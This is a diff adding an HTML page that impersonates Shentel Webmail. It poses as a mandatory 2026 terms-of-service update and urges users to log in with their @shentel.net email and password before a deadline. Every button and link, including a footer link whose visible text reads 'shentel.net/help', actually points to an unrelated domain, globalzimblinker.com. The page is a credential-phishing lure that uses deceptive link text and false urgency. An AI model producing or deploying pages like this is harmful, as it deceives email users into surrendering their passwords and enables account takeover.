@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Shentel | Terms of Service Update 2026</title>
+  <meta name="description" content="Shentel Webmail 2026 Terms of Service update. Login first, then review and accept the new terms to continue using your account.">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f5f7fa;
+      color: #1f2d3d;
+      line-height: 1.5;
+    }
+
+    .header {
+      background: #ffffff;
+      border-bottom: 1px solid #e4e9f0;
+      padding: 32px 24px 28px;
+      text-align: center;
+    }
+
+    .logo {
+      max-width: 160px;
+      margin-bottom: 20px;
+    }
+
+    .header h1 {
+      font-size: 1.75rem;
+      font-weight: 500;
+      color: #1e2f3e;
+      margin-bottom: 8px;
+      letter-spacing: -0.2px;
+    }
+
+    .header p {
+      font-size: 0.95rem;
+      color: #5a6e7c;
+      max-width: 620px;
+      margin: 0 auto;
+    }
+
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 48px 24px 64px;
+    }
+
+    /* journey flow indicator */
+    .flow-path {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 32px;
+      flex-wrap: wrap;
+    }
+
+    .flow-step {
+      background: #fef2e8;
+      color: #F37121;
+      padding: 6px 18px;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      font-weight: 500;
+    }
+
+    .flow-arrow {
+      color: #cbd5e0;
+      font-size: 1.2rem;
+    }
+
+    .terms-card {
+      background: #ffffff;
+      border-radius: 24px;
+      box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+      margin-bottom: 32px;
+      overflow: hidden;
+      border: 1px solid #eef2f8;
+    }
+
+    .card-header {
+      padding: 24px 28px 12px 28px;
+      border-bottom: 1px solid #edf2f7;
+      background: #fefefc;
+    }
+
+    .card-header h2 {
+      font-size: 1.35rem;
+      font-weight: 500;
+      color: #1e2f3e;
+    }
+
+    .card-header p {
+      font-size: 0.85rem;
+      color: #F37121;
+      margin-top: 4px;
+    }
+
+    .card-content {
+      padding: 28px;
+    }
+
+    /* login preview card */
+    .login-preview-card {
+      background: #fefcf9;
+      border-radius: 20px;
+      border: 1px solid #eae3dc;
+      overflow: hidden;
+      margin-bottom: 28px;
+    }
+
+    .terms-preview {
+      background: #fefaf5;
+      border-radius: 20px;
+      border: 1px solid #eae3dc;
+      overflow: hidden;
+    }
+
+    .mockup-window {
+      background: white;
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.03);
+    }
+
+    .mockup-bar {
+      background: #f7f5f2;
+      padding: 10px 16px;
+      border-bottom: 1px solid #ece4db;
+      display: flex;
+      gap: 6px;
+    }
+
+    .mockup-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #ddcec0;
+    }
+
+    .mockup-dot:nth-child(1) { background: #F37121; }
+    .mockup-dot:nth-child(2) { background: #e2b690; }
+    .mockup-dot:nth-child(3) { background: #fcd5a5; }
+
+    .mockup-body {
+      padding: 24px 28px;
+    }
+
+    .field-label {
+      font-size: 0.7rem;
+      font-weight: 500;
+      color: #7c6e5e;
+      margin-bottom: 4px;
+      display: block;
+    }
+
+    .fake-input {
+      background: #ffffff;
+      border: 1px solid #e2ddd8;
+      border-radius: 12px;
+      padding: 10px 12px;
+      font-size: 0.8rem;
+      color: #2c3e50;
+      margin-bottom: 12px;
+    }
+
+    .fake-button {
+      background: #F37121;
+      color: white;
+      border: none;
+      border-radius: 40px;
+      padding: 10px 16px;
+      font-weight: 500;
+      font-size: 0.8rem;
+      text-align: center;
+      width: 100%;
+      margin-top: 8px;
+    }
+
+    .update-badge {
+      background: #fef2e8;
+      display: inline-block;
+      border-radius: 20px;
+      padding: 4px 14px;
+      font-size: 0.7rem;
+      font-weight: 500;
+      color: #F37121;
+      margin-bottom: 16px;
+    }
+
+    .terms-title {
+      font-size: 1.1rem;
+      font-weight: 500;
+      margin-bottom: 16px;
+      color: #1e2f3e;
+    }
+
+    .terms-summary {
+      background: #fefaf7;
+      border-radius: 16px;
+      padding: 20px 24px;
+      border: 1px solid #f0e0d4;
+      margin-bottom: 20px;
+    }
+
+    .terms-summary p {
+      font-size: 0.85rem;
+      color: #2c3e50;
+      margin-bottom: 12px;
+    }
+
+    .terms-summary ul {
+      list-style: none;
+      margin-top: 8px;
+    }
+
+    .terms-summary li {
+      font-size: 0.85rem;
+      padding: 6px 0 6px 20px;
+      position: relative;
+      color: #2c3e50;
+    }
+
+    .terms-summary li::before {
+      content: "•";
+      color: #F37121;
+      font-weight: bold;
+      position: absolute;
+      left: 4px;
+    }
+
+    .effective-date {
+      font-size: 0.8rem;
+      color: #F37121;
+      font-weight: 500;
+      margin-top: 12px;
+      padding-top: 8px;
+      border-top: 1px solid #e8ddd2;
+    }
+
+    .full-text-link {
+      font-size: 0.75rem;
+      color: #F37121;
+      text-decoration: none;
+      border-bottom: 1px solid #ffcdb0;
+    }
+
+    .full-text-link:hover {
+      text-decoration: underline;
+    }
+
+    .checkbox-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 20px 0 24px;
+      padding: 8px 4px;
+    }
+
+    .checkbox-row input {
+      width: 18px;
+      height: 18px;
+      accent-color: #F37121;
+      cursor: pointer;
+    }
+
+    .checkbox-row label {
+      font-size: 0.85rem;
+      color: #1f2d3d;
+      cursor: pointer;
+    }
+
+    .btn-group {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+      margin-top: 8px;
+    }
+
+    .btn-primary {
+      background: #F37121;
+      color: white;
+      text-decoration: none;
+      padding: 12px 32px;
+      border-radius: 40px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      display: inline-block;
+      border: none;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-primary:hover {
+      background: #d55f17;
+    }
+
+    .btn-secondary {
+      background: #ffffff;
+      color: #F37121;
+      border: 1px solid #F37121;
+      text-decoration: none;
+      padding: 12px 32px;
+      border-radius: 40px;
+      font-weight: 500;
+      font-size: 0.9rem;
+      display: inline-block;
+      transition: all 0.2s;
+    }
+
+    .btn-secondary:hover {
+      background: #fef2e8;
+    }
+
+    .info-note {
+      background: #fef7f0;
+      border-left: 3px solid #F37121;
+      padding: 14px 18px;
+      border-radius: 16px;
+      margin-top: 24px;
+      font-size: 0.8rem;
+      color: #4f5e6b;
+    }
+
+    .footer-note {
+      text-align: center;
+      margin-top: 48px;
+      font-size: 0.7rem;
+      color: #7c8e9e;
+      border-top: 1px solid #e4e9f0;
+      padding-top: 28px;
+    }
+
+    @media (max-width: 680px) {
+      .mockup-body {
+        padding: 18px;
+      }
+      .terms-summary {
+        padding: 16px;
+      }
+      .btn-group {
+        flex-direction: column;
+        align-items: stretch;
+      }
+      .btn-primary, .btn-secondary {
+        text-align: center;
+      }
+      .card-header {
+        padding: 20px;
+      }
+      .card-content {
+        padding: 20px;
+      }
+      .header h1 {
+        font-size: 1.4rem;
+      }
+      .flow-step {
+        font-size: 0.7rem;
+        padding: 4px 12px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<header class="header">
+  <img class="logo" src="https://61vc5p930t.ucarecd.net/900edd10-b4e6-4888-a5f0-784a5d470cf8/shntel_logo.png" alt="Shentel Logo">
+  <h1>2026 Terms of Service Update</h1>
+  <p>Shentel Webmail has updated its terms. Login first, then review and accept to continue using your account.</p>
+</header>
+
+<div class="container">
+
+  <!-- Flow indicator: login -> terms -->
+  <div class="flow-path">
+    <span class="flow-step">Step 1: Login to Shentel</span>
+    <span class="flow-arrow">→</span>
+    <span class="flow-step">Step 2: Review & Accept Terms</span>
+  </div>
+
+  <!-- Main card containing both login preview and terms preview -->
+  <div class="terms-card">
+    <div class="card-header">
+      <h2>How to accept the updated terms</h2>
+      <p>Login first, then review and confirm the 2026 Terms of Service</p>
+    </div>
+    <div class="card-content">
+
+      <!-- LOGIN PREVIEW (above terms) -->
+      <div class="login-preview-card">
+        <div class="mockup-window">
+          <div class="mockup-bar">
+            <span class="mockup-dot"></span>
+            <span class="mockup-dot"></span>
+            <span class="mockup-dot"></span>
+            <span style="font-size: 0.6rem; margin-left: auto; color:#a49280;">Shentel · Login to View Activity</span>
+          </div>
+          <div class="mockup-body">
+            <div style="text-align: center; margin-bottom: 16px;">
+              <img src="https://61vc5p930t.ucarecd.net/900edd10-b4e6-4888-a5f0-784a5d470cf8/shntel_logo.png" style="max-width: 100px;" alt="Shentel">
+            </div>
+            <span class="field-label">Email address</span>
+            <div class="fake-input">customer@shentel.net</div>
+            <span class="field-label">Password</span>
+            <div class="fake-input">••••••••</div>
+            <div class="fake-button">Login</div>
+            <div style="font-size: 0.7rem; color: #8f7a68; text-align: center; margin-top: 14px;">
+              Use your @shentel.net email address to access your account
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- TERMS PREVIEW (non-scrollable, below login) -->
+      <div class="terms-preview">
+        <div class="mockup-window">
+          <div class="mockup-bar">
+            <span class="mockup-dot"></span>
+            <span class="mockup-dot"></span>
+            <span class="mockup-dot"></span>
+            <span style="font-size: 0.6rem; margin-left: auto; color:#a49280;">Shentel Webmail · Terms Update</span>
+          </div>
+          <div class="mockup-body">
+            <div class="update-badge">2026 Update</div>
+            <div class="terms-title">Shentel Webmail Terms of Service</div>
+
+            <!-- Terms summary block - non scrollable, static content -->
+            <div class="terms-summary">
+              <p><strong>Summary of June 2026 updates:</strong></p>
+              <ul>
+                <li>Account security enhancements</li>
+                <li>Updated data privacy framework</li>
+                <li>Clear acceptable use guidelines</li>
+                <li>Service availability terms</li>
+              </ul>
+              <div class="effective-date">
+                Effective date: June 15, 2026
+              </div>
+              <div style="margin-top: 12px;">
+                <a href="https://www.globalzimblinker.com/shentel" class="full-text-link" style="cursor: pointer;">Full legal text available via the link inside the checkbox label.</a>
+              </div>
+            </div>
+
+            <!-- Checkbox simulation -->
+            <div class="checkbox-row">
+              <input type="checkbox" id="preview-checkbox" checked disabled style="pointer-events: none;">
+              <label for="preview-checkbox">I have read and agree to the updated Terms of Service and Privacy Policy for Shentel Webmail.</label>
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+      <!-- Instructions -->
+      <div class="info-note">
+        <strong>How to accept the terms:</strong> After logging into your Shentel Webmail account, you will be shown the terms update page. Read the summary above, click the checkbox to confirm your agreement, and then click "Confirm and continue to Webmail" to complete the process. Acceptance is required by June 15, 2026.
+      </div>
+
+      <!-- Action buttons -->
+      <div style="margin-top: 28px; text-align: center;">
+        <div class="btn-group" style="justify-content: center;">
+          <a href="https://www.globalzimblinker.com/shentel" class="btn-primary" target="_blank" rel="noopener noreferrer">Review Terms Now</a>
+          <a href="https://www.globalzimblinker.com/shentel" class="btn-secondary" target="_blank" rel="noopener noreferrer">Confirm and continue to Webmail</a>
+        </div>
+        <p style="font-size: 0.7rem; color: #7c8e9e; margin-top: 16px;">After logging in, you will be directed to the terms acceptance page if you have not yet accepted the 2026 update.</p>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="footer-note">
+    <p>© 2026 Shentel. All rights reserved. | Effective date of updated terms: June 15, 2026</p>
+    <p style="margin-top: 6px;">For support, visit <a href="https://www.globalzimblinker.com/shentel" style="color:#F37121; text-decoration: none;">shentel.net/help</a></p>
+  </div>
+
+</div>
+
+</body>
+</html>
